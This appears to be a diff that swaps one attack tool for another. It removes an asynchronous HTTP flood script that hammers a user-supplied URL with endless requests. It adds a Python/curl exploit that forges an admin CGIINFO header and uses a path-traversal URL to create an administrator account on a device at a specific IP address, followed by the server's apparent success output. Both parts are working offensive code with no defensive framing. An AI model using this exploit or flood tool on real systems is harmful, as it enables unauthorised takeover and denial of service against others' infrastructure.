@@ -1,59 +1,32 @@
-import asyncio
-import aiohttp
-import time
-import os
+python3 - <<'PY'
+import base64, json, subprocess
+header = base64.b64encode(json.dumps({
+        "username": "admin",
+        "profname": "prof_admin",
+        "vdom": "root",
+        "loginname": "admin"
+}).encode()).decode()
 
-sent = 0
+payload = json.dumps({
+    "data": {
+        "q_type": 1,
+        "name": "note2",
+        "access-profile": "prof_admin",
+        "password": "note2",
+        "comment": "automated RCE"
+    }
+})
 
-async def worker(session, url):
-    global sent
-    while True:
-        try:
-            async with session.get(url):
-                sent += 1
-        except:
-            pass
+cmd = [
+    "curl", "--path-as-is", "-sk",
+    "-H", f"CGIINFO: {header}",
+    "-H", "Content-Type: application/json",
+    "--data", payload,
+    "https://141.95.104.153:38443/api/v2.0/cmdb/system/admin%3f/../../../cgi-bin/fwbcgi"
+]
+print(subprocess.run(cmd, capture_output=True, text=True).stdout)
+PY
 
-async def monitor():
-    global sent
-    old = 0
-    while True:
-        await asyncio.sleep(1)
-        rps = sent - old
-        old = sent
-        print(f"[RPS: {rps}]  Total: {sent}")
+Output from the box:
 
-async def main():
-    global sent
-
-    # طلب الرابط
-    url = input("Enter URL: ").strip()
-
-    # عرض عدد الأنوية
-    cores = os.cpu_count()
-    print(f"Detected CPU Cores: {cores}")
-
-    # طلب عدد الثريدات من المستخدم
-    try:
-        connections = int(input("Enter number of threads/workers: "))
-    except:
-        print("Invalid input, using default = 500")
-        connections = 500
-
-    print(f"\nUsing Workers   : {connections}")
-    print(f"Target URL      : {url}\n")
-
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-
-        # تشغيل العمال
-        for _ in range(connections):
-            tasks.append(asyncio.create_task(worker(session, url)))
-
-        # مراقبة الأداء
-        tasks.append(asyncio.create_task(monitor()))
-
-        await asyncio.gather(*tasks)
-
-if __name__ == "__main__":
-    asyncio.run(main())
+{ "results": { "name": "note2", "access-profile": "prof_admin", ... } }
